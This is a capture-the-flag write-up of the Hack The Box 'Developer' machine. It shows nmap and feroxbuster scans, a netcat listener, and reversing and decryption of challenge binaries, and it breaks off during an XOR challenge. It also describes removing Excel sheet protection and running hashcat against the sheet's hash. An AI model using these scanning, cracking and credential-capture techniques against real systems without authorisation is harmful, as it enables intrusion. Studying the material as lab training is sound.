---
title: HTB: Developer
url: https://0xdf.gitlab.io/2022/01/15/htb-developer.html
date: 2022-01-15T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, htb-developer, hackthebox, youtube, nmap, feroxbuster, django, python, crypto, dnspy, ps2exe, xls, office, msoffice, excel, hashcat, reverse-engineering, gdb, ghidra, cyberchef, reverse-tab-nabbing, flask, deserialization, pickle, django-deserialization, django-pickle, sentry, postgresql
---

![Developer](https://0xdfimages.gitlab.io/img/developer-cover.png)

Developer is a CTF platform modeled off of HackTheBox! When I sign up for an account, there are eight real challenges to play across four different categories. On solving one, I can submit a write-up link, which the admin will click. This link is vulnerable to reverse-tab-nabbing, a neat exploit where the writeup opens in a new window, but it can get the original window to redirect to a site of my choosing. I’ll make it look like it logged out, and capture credentials from the admin, giving me access to the Django admin panel and the Sentry application. I’ll crash that application to see Django is running in debug mode, and get the secret necessary to perform a deserialization attack, providing execution and a foothold on the box. I’ll dump the Django hashes from the Postgresql DB for Senty and crack them to get the creds for the next user. For root, there’s a sudo executable that I can reverse to get the password which leads to SSH access as root.

## Box Info

| Name | [Developer](https://hackthebox.com/machines/developer)  [Developer](https://hackthebox.com/machines/developer) [Play on HackTheBox](https://hackthebox.com/machines/developer) |
| --- | --- |
| Release Date | [21 Aug 2021](https://twitter.com/hackthebox_eu/status/1428011772049563655) |
| Retire Date | 15 Jan 2022 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Developer |
| Radar Graph | Radar chart for Developer |
| First Blood User | 03:33:37[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| First Blood Root | 04:12:42[0xCaue 0xCaue](https://app.hackthebox.com/users/270601) |
| Creator | [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.103
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-12 17:37 EST
Nmap scan report for developer.htb (10.10.11.103)
Host is up (0.028s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.38 seconds
oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.103
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-12 17:37 EST
Nmap scan report for developer.htb (10.10.11.103)
Host is up (0.023s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Developer: Free CTF Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 Focal.

### Website - TCP 80

#### Site

The site is a CTF platform:

[![image-20210712142803604](https://0xdfimages.gitlab.io/img/image-20210712142803604.png)](https://0xdfimages.gitlab.io/img/image-20210712142803604.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210712142803604.png)

All of the links on the page go to places in this front page, except for Login (`/accounts/login`) and Signup (`/accounts/signup`).

#### Account Pages

`/accounts/login` has a login for:

![image-20210712145414570](https://0xdfimages.gitlab.io/img/image-20210712145414570.png)

There’s a potential domain there in developer.htb.

The forgot password link (`/accounts/password/reset`) gives another form:

![image-20210712145529593](https://0xdfimages.gitlab.io/img/image-20210712145529593.png)

It will verify if an email address is in the system or not:

![image-20210712145556680](https://0xdfimages.gitlab.io/img/image-20210712145556680.png)

Some quick guesses didn’t reveal any accounts (admin, administrator, root, dev, developer all returned negative).

The signup page has a form which I’ll fill in. When I try to submit with the password 0xdf, some client-side validation requires some password strength and a username of 5+ characters:

![image-20210712192618961](https://0xdfimages.gitlab.io/img/image-20210712192618961.png)

On successfully creating an account, I’m at a dashboard for a CTF site with machine difficulties and challenge categories running down the left sidebar:

[![image-20210712192904676](https://0xdfimages.gitlab.io/img/image-20210712192904676.png)](https://0xdfimages.gitlab.io/img/image-20210712192904676.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210712192904676.png)

The Machines section is all empty (says “coming soon”), but there are challenges across four categories (web is empty). For example, Forensics:

![image-20210713062147287](https://0xdfimages.gitlab.io/img/image-20210713062147287.png)

There are a total of eight, with some homage to some talented HTB players:

| Name | Points | Category | Author |
| --- | --- | --- | --- |
| PSE | 10 | Forensic | dmw0ng |
| Phished List | 10 | Forensic | jazzpizazz |
| Lucky Guess | 10 | Reversing | admin |
| RevMe | 10 | Reversing | admin |
| Authentication | 20 | Reversing | admin |
| PwnMe | 10 | Pwn | clubby789 |
| Easy Encryption | 10 | Crypto | admin |
| Triple Whammy | 10 | Crypto | willwam845 |

I’ll show solutions to all eight later, but on submitting a flag, the challenge now shows with a Completed tag, and the Submit Flag button now says Submit a Walkthrough:

![image-20210713063016380](https://0xdfimages.gitlab.io/img/image-20210713063016380.png)

Clicking that pops a window requesting a URL:

![image-20210713062505012](https://0xdfimages.gitlab.io/img/image-20210713062505012.png)

It also says the admins will check the walkthroughs, which is a good indication there’s some automated user interactions on this host.

I post my own URL, and immediate the link is on my profile page:

![image-20210713064027850](https://0xdfimages.gitlab.io/img/image-20210713064027850.png)

I’ve got `nc` listening on 80, but no immediate response. Then, within a couple minutes, there’s a connection:

```

oxdf@parrot$ nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.120] 35462
GET /test2 HTTP/1.1
Host: 10.10.14.6
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

```

Leaving a Python webserver open, the link is clicked every two minutes or so.

#### Tech Stack

The HTTP response headers don’t give much information about how the site is hosted other than the Apache version.

The page source doesn’t give much else either. There is an uninitialized Google Analytics script block at the bottom of the page:

```

	<!-- Google Analytics: change UA-XXXXX-X to be your site's ID. -->
		<script>
		(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
		function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
		e=o.createElement(i);r=o.getElementsByTagName(i)[0];
		e.src='//www.google-analytics.com/analytics.js';
		r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
		ga('create','UA-XXXXX-X');ga('send','pageview');
		</script>

```

It’s not clear if that’s part of the client-side template the site uses or part of the framework running server side to include that.

Noticing paths like `/accounts/login`, I checked `/accounts` and `/accounts/`. Both returned 404, which wouldn’t make sense for something like PHP, but would make sense for some of the Python or Ruby frameworks.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and immediately I get a ton of 302s inside folders like `newadmin`, `comadmin`, `superadmin`, `mysql_admin`. I’ll re-run with `-C 302` to get rid of that clutter:

```

oxdf@parrot$ feroxbuster -u http://10.10.10.120 -C 302

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.120
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💢  Status Code Filters   │ [302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        0l        0w        0c http://10.10.10.120/metaadmin
301        0l        0w        0c http://10.10.10.120/useradmin
301        0l        0w        0c http://10.10.10.120/db_admin
301        0l        0w        0c http://10.10.10.120/blogadmin
301        0l        0w        0c http://10.10.10.120/_phpmyadmin
301        0l        0w        0c http://10.10.10.120/creo_admin
301        0l        0w        0c http://10.10.10.120/phpldapadmin
301        0l        0w        0c http://10.10.10.120/pn-admin
301        0l        0w        0c http://10.10.10.120/as-admin
301        0l        0w        0c http://10.10.10.120/iadmin
301        0l        0w        0c http://10.10.10.120/ssadmin
301        0l        0w        0c http://10.10.10.120/os_admin
301        0l        0w        0c http://10.10.10.120/csadmin
301        0l        0w        0c http://10.10.10.120/contentadmin
301        0l        0w        0c http://10.10.10.120/content_admin
301        0l        0w        0c http://10.10.10.120/eadmin
301        0l        0w        0c http://10.10.10.120/site_admin
301        0l        0w        0c http://10.10.10.120/superadmin
301        0l        0w        0c http://10.10.10.120/bb-admin
301        0l        0w        0c http://10.10.10.120/my_admin
[####################] - 1m    629979/629979  0s      found:20      errors:585276 
[####################] - 1m     29999/29999   477/s   http://10.10.10.120
[####################] - 1m     29999/29999   495/s   http://10.10.10.120/metaadmin
[####################] - 1m     29999/29999   451/s   http://10.10.10.120/useradmin
[####################] - 57s    29999/29999   526/s   http://10.10.10.120/db_admin
[####################] - 1m     29999/29999   449/s   http://10.10.10.120/blogadmin
[####################] - 57s    29999/29999   546/s   http://10.10.10.120/_phpmyadmin
[####################] - 1m     29999/29999   490/s   http://10.10.10.120/creo_admin
[####################] - 1m     29999/29999   493/s   http://10.10.10.120/phpldapadmin
[####################] - 48s    29999/29999   631/s   http://10.10.10.120/pn-admin
[####################] - 34s    29999/29999   907/s   http://10.10.10.120/as-admin
[####################] - 42s    29999/29999   783/s   http://10.10.10.120/iadmin
[####################] - 59s    29999/29999   520/s   http://10.10.10.120/ssadmin
[####################] - 35s    29999/29999   855/s   http://10.10.10.120/os_admin
[####################] - 55s    29999/29999   536/s   http://10.10.10.120/csadmin
[####################] - 37s    29999/29999   788/s   http://10.10.10.120/contentadmin
[####################] - 21s    29999/29999   1781/s  http://10.10.10.120/content_admin
[####################] - 27s    29999/29999   1080/s  http://10.10.10.120/eadmin
[####################] - 21s    29999/29999   1634/s  http://10.10.10.120/site_admin
[####################] - 23s    29999/29999   1284/s  http://10.10.10.120/superadmin
[####################] - 24s    29999/29999   1248/s  http://10.10.10.120/bb-admin
[####################] - 21s    29999/29999   1383/s  http://10.10.10.120/my_admin

```

It looks like anything ending in `admin` is given a 301. Testing it in Firefox confirms that anything ending in `admin` (such as `0xdfadmin`) redirects to `/admin/login/?next=[entered url]`. This is the Django admin login page:

![image-20210712145211440](https://0xdfimages.gitlab.io/img/image-20210712145211440.png)

Some quick password guessing doesn’t work, but at least I know it’s [Django](https://www.djangoproject.com/), a Python-based web framework.

### Challenges

To complete the box, I’ll need to solve at least one challenge to enable the option to submit a writeup. I’m just going to show the quickest path to getting the flag for each, but they are each neat little games on their own.

#### PSE

The challenge provides an encrypted string and download:

![image-20220112175028311](https://0xdfimages.gitlab.io/img/image-20220112175028311.png)

The download is a Windows .NET executable:

```

oxdf@parrot$ file Encryption.exe 
Encryption.exe: PE32+ executable (GUI) x86-64 Mono/.Net assembly, for MS Windows

```

On running it in a Windows VM, it pops a dialog asking for a password:

![image-20210713111803252](https://0xdfimages.gitlab.io/img/image-20210713111803252.png)

Entering data into the top field and clicking ok puts the “encrypted” version into the bottom field:

![image-20210713111907616](https://0xdfimages.gitlab.io/img/image-20210713111907616.png)

Opening the binary in [DNSpy](https://github.com/dnSpy/dnSpy), there’s a bunch of stuff I need to ignore, and the `main` in `PS2EXE`:

![image-20210713135918965](https://0xdfimages.gitlab.io/img/image-20210713135918965.png)

A bit into `main`, there’s a base64 blob that gets decoded:

![image-20210713135947109](https://0xdfimages.gitlab.io/img/image-20210713135947109.png)

And then passed into a `PowerShell` object:

![image-20210713140014218](https://0xdfimages.gitlab.io/img/image-20210713140014218.png)

I can decode that to get some PowerShell.

[ps2exe](https://github.com/studoot/ps2exe) is a way to compile a PowerShell script into an executable file. The [Readme.txt](https://github.com/studoot/ps2exe/blob/master/Readme.txt) file on that repo also has a useful hint:

> Password security:
> Never store passwords in your compiled script! One can simply decompile the script with the parameter -extract. For example
> Output.exe -extract:C:\Output.ps1
> will decompile the script stored in Output.exe.

I can get the same output by running:

```

PS >.\Encryption.exe -extract:.\Encryption.ps1

```

Either way, the following comes out:

```

[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
[Reflection.Assembly]::LoadWithPartialName("System.Security") 

function Encrypt-String($String, $Passphrase, $salt="CrazilySimpleSalt", $init="StupidlyEasy_IV", [switch]$arrayOutput) 
{ 
    $r = new-Object System.Security.Cryptography.RijndaelManaged 
    $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase) 
    $salt = [Text.Encoding]::UTF8.GetBytes($salt) 
 
    $r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32)
    $r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15] 
       
    $c = $r.CreateEncryptor() 
    $ms = new-Object IO.MemoryStream 
    $cs = new-Object Security.Cryptography.CryptoStream $ms,$c,"Write" 
    $sw = new-Object IO.StreamWriter $cs 
    $sw.Write($String) 
    $sw.Close() 
    $cs.Close() 
    $ms.Close()  
    $r.Clear() 
    [byte[]]$result = $ms.ToArray() 
    return [Convert]::ToBase64String($result) 
}

$objForm = New-Object System.Windows.Forms.Form 
$objForm.Text = "Data Encryption"
$objForm.Size = New-Object System.Drawing.Size(300,250) 
$objForm.StartPosition = "CenterScreen"

$OKButton = New-Object System.Windows.Forms.Button
$OKButton.Location = New-Object System.Drawing.Size(30,160)
$OKButton.Size = New-Object System.Drawing.Size(75,23)
$OKButton.Text = "OK"
$OKButton.Add_Click(
{
$string=$objTextBoxincnum.Text
$encrypted = Encrypt-String $string "AmazinglyStrongPassword"
$objTextBoxincdes.Text = $encrypted
}
)
$objForm.Controls.Add($OKButton)

$CancelButton = New-Object System.Windows.Forms.Button
...[snip]...
[void] $objForm.ShowDialog()

```

The `Encrypt-String` function has the seeds for the salt and the iv, and the invocation gives the password “AmazinglyStrongPassword”. I could write my own decryptor, but there’s one [here](https://github.com/buuren/powershell/blob/master/misc/encryptPassword.ps1) that will work just fine.

I’ll copy the `Decrypt-String` function from that repo into a file, and at the bottom, call it with the string from the prompt, and the password, salt, and iv from the code:

```

...[snip]...
Decrypt-String "X/o8VJQE1pyQhjmpcwk45+L069bivpF63PjZP4z7ahKaC+jv89NT6ze0T5id0lWC" "AmazinglyStrongPassword" "CrazilySimpleSalt" "StupidlyEasy_IV"

```

On running, it gives the flag:

```

PS > .\decrypt.ps1
DHTB{P0w3rsh3lL_F0r3n51c_M4dn3s5}

```
**Flag: DHTB{P0w3rsh3lL\_F0r3n51c\_M4dn3s5}**

#### Phished List

The download has a `.xlsx` file, which is an Excel workbook. After a quick check showed no macros, no OLE objects, I opened it in Excel to find 100 rows of names, emails, and recovery information:

![image-20210713142054046](https://0xdfimages.gitlab.io/img/image-20210713142054046.png)

I’ll also note that column E is hidden. Unfortunately, I can’t unhide it because the sheet is protected:

![image-20210713142136816](https://0xdfimages.gitlab.io/img/image-20210713142136816.png)

Clicking Unprotect Sheet prompts for a password.

The fastest way to get around this is to turn the book into a Zip and [edit out the protection](https://www.youtube.com/watch?v=2x23vZIRYRs). I’ll create a copy of the document and change the extension to `.zip`:

![image-20210713142302525](https://0xdfimages.gitlab.io/img/image-20210713142302525.png)

Double clicking on that to go into the zip, and then a couple folders in, I’ll find `sheet1.xml`:

![image-20210713142351788](https://0xdfimages.gitlab.io/img/image-20210713142351788.png)

I’ll drag that file somewhere to work on it (like the desktop), which extracts it from the archive. I’ll open it in notepad++, and do a Ctrl-F to search for Protection:

![image-20210713142523793](https://0xdfimages.gitlab.io/img/image-20210713142523793.png)

Now I’ll just remove that XML element (which Notepad++ nicely highlights). I’ll save it, delete the old `sheet1.xml` in the zip, and drag the new into it. Now back to the folder with the zip, I’ll rename it back to `.xlsx`. On opening it, the sheet is no longer protected, and I can find the flag in row 62:

[![image-20210713142829602](https://0xdfimages.gitlab.io/img/image-20210713142829602.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210713142829602.png)
**Flag: DHTB{H1dD3N\_C0LuMn5\_FtW}**

Beyond just removing the encryption, I can look at it and try to crack it:

```

<sheetProtection algorithmName="SHA-512" hashValue="Y4Ko7kZUKStIxaVGWEtuMeRdnCiN7O3D8qZtKdo/2jP7WE6yzKQXUcSWQ/E0OrqHCzhOBFX+t8Db5Pxaiu+N1g==" saltValue="EoiHQklf0FagPs+iW0OzkA==" spinCount="100000" sheet="1" objects="1" scenarios="1"/>

```

Based on the [hashcat list of example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes), I think this would make a hash like:

```

$office$2016$0$100000$EoiHQklf0FagPs+iW0OzkA==$Y4Ko7kZUKStIxaVGWEtuMeRdnCiN7O3D8qZtKdo/2jP7WE6yzKQXUcSWQ/E0OrqHCzhOBFX+t8Db5Pxaiu+N1g==

```

I ran this through `rockyou.txt`, which took over a day, but didn’t get any match.

```

$ hashcat -m 25300 test /usr/share/wordlists/rockyou.txt
...[snip]...

```

#### Lucky Guess

The download is a 64-bit Linux ELF:

```

oxdf@parrot$ file getlucky 
getlucky: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d9877fe65704a8279e61f0218a2ce50cc4369c18, for GNU/Linux 3.2.0, not stripped

```

The game seems to pick two random numbers and see if they are the same:

```

oxdf@parrot$ ./getlucky 
Can you roll the lucky number?
Enter your name to play the game:
0xdf
The number is: 404
You rolled: 186.
Better luck next time!
Game Over!
oxdf@parrot$ ./getlucky 
Can you roll the lucky number?
Enter your name to play the game:
0xdf
The number is: 390
You rolled: 72.
Better luck next time!
Game Over!

```

Before firing up Ghidra, I decided to take a quick look in `gdb`:

```

oxdf@parrot$ gdb -q ./getlucky
Reading symbols from ./getlucky...
(No debugging symbols found in ./getlucky)
gdb-peda$ 

```

I’ll list the functions, and `winner` stands out:

```

gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001030  puts@plt
0x0000000000001040  strlen@plt
0x0000000000001050  printf@plt
0x0000000000001060  srand@plt
0x0000000000001070  time@plt
0x0000000000001080  __isoc99_scanf@plt
0x0000000000001090  rand@plt
0x00000000000010a0  __cxa_finalize@plt
0x00000000000010b0  _start
0x00000000000010e0  deregister_tm_clones
0x0000000000001110  register_tm_clones
0x0000000000001150  __do_global_dtors_aux
0x0000000000001190  frame_dummy
0x0000000000001195  winner
0x0000000000001285  play
0x000000000000133b  main
0x00000000000013a0  __libc_csu_init
0x0000000000001400  __libc_csu_fini
0x0000000000001404  _fini

```

I’ll put a break at `main`, then jump to `winner`, and get the flag:

```

gdb-peda$ b main 
Breakpoint 1 at 0x133f
gdb-peda$ r
Breakpoint 1, 0x000055555555533f in main ()
gdb-peda$ j winner
Continuing at 0x555555555199.

Well done!
You managed to beat me! Here's a flag for your efforts:

DHTB{gOInGWITHtHEfLOW}
[Inferior 1 (process 144126) exited with code 027]
Warning: not running

```
**Flag: DHTB{gOInGWITHtHEfLOW}**

#### RevMe

The download is another .NET executable, this time 32-bit:

```

oxdf@parrot$ file RevMe.exe 
RevMe.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows

```

In a Windows VM, running it just prints a message:

```

PS >.\RevMe.exe
TheCyberGeek's RevMe Challenge
Can you pwn me???

```

Opening it in [DNSpy](https://github.com/dnSpy/dnSpy), there’s a few classes with functions:

![image-20210713154652775](https://0xdfimages.gitlab.io/img/image-20210713154652775.png)

The `Main` function calls the anti-debug functions, prints the message, and exits:

```

// ConsoleApp2.Program
// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
private static void Main(string[] args)
{
	Scanner.ScanAndKill();
	DebugProtect1.PerformChecks();
	Console.WriteLine("TheCyberGeek's RevMe Challenge");
	Console.WriteLine("Can you pwn me???");
}

```

The `ScanAndKill` function looks for various debug and reversing programs and kills them, and `PerformChecks` detects the presence of a debugger. But none of that matters, as there’s also `EmbeddedSecret`, which has the flag:

```

// ConsoleApp2.Program
// Token: 0x06000002 RID: 2 RVA: 0x00002078 File Offset: 0x00000278
private static string EmbeddedSecret()
{
	return "DHTB{TCG5_S1mPl3_R3v3r51nG_Ch4773nG3}";
}

```
**Flag: DHTB{TCG5\_S1mPl3\_R3v3r51nG\_Ch4773nG3}**

#### Authentication

This is another 64-bit ELF:

```

oxdf@parrot$ file authenticate
authenticate: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=95ac617025cf1bfe1e6749172a7888dfc4fe4dfe, for GNU/Linux 3.2.0, with debug_info, not stripped

```

I’ll reverse this binary in [this video](https://www.youtube.com/watch?v=YrxFXvdtyDo):

To summarize, I’ll find the comparison where the password and my input are compared in `main::check_password`:

![image-20220112211150231](https://0xdfimages.gitlab.io/img/image-20220112211150231.png)

I’ll use that address to put a break in `gdb` and see the arguments passed to the `eq` call, once of which is the flag:

![image-20220112211228176](https://0xdfimages.gitlab.io/img/image-20220112211228176.png)
**Flag: DHTB{rusty\_bu5in3s5}**

#### PwnMe

Another Linux executable:

```

oxdf@parrot$ file pwnme 
pwnme: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=02b77125889f0f89c37d81f803186dbf900506d4, for GNU/Linux 3.2.0, not stripped

```

Running it says to pass the password as an argument:

```

oxdf@parrot$ ./pwnme 
Please enter your password as a program argument!
oxdf@parrot$ ./pwnme 0xdf
Wrong password.

```

In `gdb`, two interesting functions, `main` and `check_password`:

```

gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001030  strcpy@plt
0x0000000000001040  puts@plt
0x0000000000001050  strcmp@plt
0x0000000000001060  __cxa_finalize@plt
0x0000000000001070  _start
0x00000000000010a0  deregister_tm_clones
0x00000000000010d0  register_tm_clones
0x0000000000001110  __do_global_dtors_aux
0x0000000000001150  frame_dummy
0x0000000000001155  check_password
0x00000000000011f3  main
0x00000000000012b0  __libc_csu_init
0x0000000000001310  __libc_csu_fini
0x0000000000001314  _fini

```

Looking at the disassembly of `check_password`, it calls `strcmp` towards the end (at +137):

```

gdb-peda$ disassemble check_password
Dump of assembler code for function check_password:
   0x0000000000001155 <+0>:     push   rbp
   0x0000000000001156 <+1>:     mov    rbp,rsp
   0x0000000000001159 <+4>:     sub    rsp,0x50
   0x000000000000115d <+8>:     mov    QWORD PTR [rbp-0x48],rdi
   0x0000000000001161 <+12>:    mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000001168 <+19>:    movabs rax,0xb9b1c3c2b5c0c5c3
   0x0000000000001172 <+29>:    mov    QWORD PTR [rbp-0x3d],rax
   0x0000000000001176 <+33>:    mov    DWORD PTR [rbp-0x35],0x83beb1c9
   0x000000000000117d <+40>:    mov    BYTE PTR [rbp-0x31],0x0
   0x0000000000001181 <+44>:    lea    rax,[rbp-0x3d]
   0x0000000000001185 <+48>:    mov    QWORD PTR [rbp-0x10],rax
   0x0000000000001189 <+52>:    jmp    0x119f <check_password+74>
   0x000000000000118b <+54>:    mov    rax,QWORD PTR [rbp-0x10]
   0x000000000000118f <+58>:    lea    rdx,[rax+0x1]
   0x0000000000001193 <+62>:    mov    QWORD PTR [rbp-0x10],rdx
   0x0000000000001197 <+66>:    movzx  edx,BYTE PTR [rax]
   0x000000000000119a <+69>:    sub    edx,0x50
   0x000000000000119d <+72>:    mov    BYTE PTR [rax],dl
   0x000000000000119f <+74>:    mov    rax,QWORD PTR [rbp-0x10]
   0x00000000000011a3 <+78>:    movzx  eax,BYTE PTR [rax]
   0x00000000000011a6 <+81>:    test   al,al
   0x00000000000011a8 <+83>:    jne    0x118b <check_password+54>
   0x00000000000011aa <+85>:    mov    rdx,QWORD PTR [rbp-0x48]
   0x00000000000011ae <+89>:    lea    rax,[rbp-0x20]
   0x00000000000011b2 <+93>:    mov    rsi,rdx
   0x00000000000011b5 <+96>:    mov    rdi,rax
   0x00000000000011b8 <+99>:    call   0x1030 <strcpy@plt>
   0x00000000000011bd <+104>:   lea    rdx,[rbp-0x3d]
   0x00000000000011c1 <+108>:   lea    rax,[rbp-0x30]
   0x00000000000011c5 <+112>:   mov    rsi,rdx
   0x00000000000011c8 <+115>:   mov    rdi,rax
   0x00000000000011cb <+118>:   call   0x1030 <strcpy@plt>
   0x00000000000011d0 <+123>:   lea    rdx,[rbp-0x30]
   0x00000000000011d4 <+127>:   lea    rax,[rbp-0x20]
   0x00000000000011d8 <+131>:   mov    rsi,rdx
   0x00000000000011db <+134>:   mov    rdi,rax
   0x00000000000011de <+137>:   call   0x1050 <strcmp@plt>
   0x00000000000011e3 <+142>:   test   eax,eax
   0x00000000000011e5 <+144>:   jne    0x11ee <check_password+153>
   0x00000000000011e7 <+146>:   mov    DWORD PTR [rbp-0x4],0x1
   0x00000000000011ee <+153>:   mov    eax,DWORD PTR [rbp-0x4]
   0x00000000000011f1 <+156>:   leave  
   0x00000000000011f2 <+157>:   ret    
End of assembler dump.

```

I’ll put a break there, and run:

```

gdb-peda$ break *check_password+137
Breakpoint 1 at 0x11de
gdb-peda$ r 0xdf0xdf                                                                                     
Starting program: /media/sf_CTFs/hackthebox/developer-10.10.10.120/challenges/pwnme 0xdf0xdf
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdcc0 ("0xdf0xdf")
RBX: 0x0 
RCX: 0x6961737265707573 ('supersai')
RDX: 0x7fffffffdcb0 ("supersaiyan3")
RSI: 0x7fffffffdcb0 ("supersaiyan3")
RDI: 0x7fffffffdcc0 ("0xdf0xdf")
RBP: 0x7fffffffdce0 --> 0x7fffffffdd20 --> 0x5555555552b0 (<__libc_csu_init>:   push   r15)
RSP: 0x7fffffffdc90 --> 0x0 
RIP: 0x5555555551de (<check_password+137>:      call   0x555555555050 <strcmp@plt>)
R8 : 0x0 
R9 : 0x336e6179696173 ('saiyan3')
R10: 0xfffffffffffff28c 
R11: 0x7ffff7f40ff0 (<__strcpy_avx2>:   mov    rcx,rsi)
R12: 0x555555555070 (<_start>:  xor    ebp,ebp)
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5555555551d4 <check_password+127>: lea    rax,[rbp-0x20]
   0x5555555551d8 <check_password+131>: mov    rsi,rdx
   0x5555555551db <check_password+134>: mov    rdi,rax
=> 0x5555555551de <check_password+137>: call   0x555555555050 <strcmp@plt>
   0x5555555551e3 <check_password+142>: test   eax,eax
   0x5555555551e5 <check_password+144>: jne    0x5555555551ee <check_password+153>
   0x5555555551e7 <check_password+146>: mov    DWORD PTR [rbp-0x4],0x1
   0x5555555551ee <check_password+153>: mov    eax,DWORD PTR [rbp-0x4]
Guessed arguments:
arg[0]: 0x7fffffffdcc0 ("0xdf0xdf")
arg[1]: 0x7fffffffdcb0 ("supersaiyan3")
arg[2]: 0x7fffffffdcb0 ("supersaiyan3")
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdc90 --> 0x0 
0008| 0x7fffffffdc98 --> 0x7fffffffe19d ("0xdf0xdf")
0016| 0x7fffffffdca0 --> 0x7265707573000000 ('')
0024| 0x7fffffffdca8 --> 0x336e6179696173 ('saiyan3')
0032| 0x7fffffffdcb0 ("supersaiyan3")
0040| 0x7fffffffdcb8 --> 0x336e6179 ('yan3')
0048| 0x7fffffffdcc0 ("0xdf0xdf")
0056| 0x7fffffffdcc8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00005555555551de in check_password ()

```

The “guessed arguments” in the [Peda](https://github.com/longld/peda) output show it’s passing my input and “supersaiyan3”. Running with that password prints the flag:

```

oxdf@parrot$ ./pwnme supersaiyan3
Password correct. Here's a flag:
DHTB{b4s1c0v3rF7ow}

```
**Flag: DHTB{b4s1c0v3rF7ow}**

#### Easy Encryption

There’s a base64 string and a download:

![image-20220113072642738](https://0xdfimages.gitlab.io/img/image-20220113072642738.png)

The download is a Python script:

```

#!/usr/bin/python3
from itertools import izip, cycle
import base64

def xor_crypt_string(data, key='**'):
    xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))
    return base64.encodestring(xored).strip()

secret_data = "<REDACTED>"
print xor_crypt_string(secret_data)

```

It’s going to XOR with a key of unknown length. The good news is that I know the first five bytes of the flag, `DHBT{`. I’ll drop the base64 blob into [CyberChef](https://gchq.github.io/CyberChef), decode it, and the add XOR. With no key, it’s not ASCII:

![image-20210713170710184](https://0xdfimages.gitlab.io/img/image-20210713170710184.png)

If I add the expected plaintext, something interesting returns:

![image-20210713170738014](https://0xdfimages.gitlab.io/img/image-20210713170738014.png)

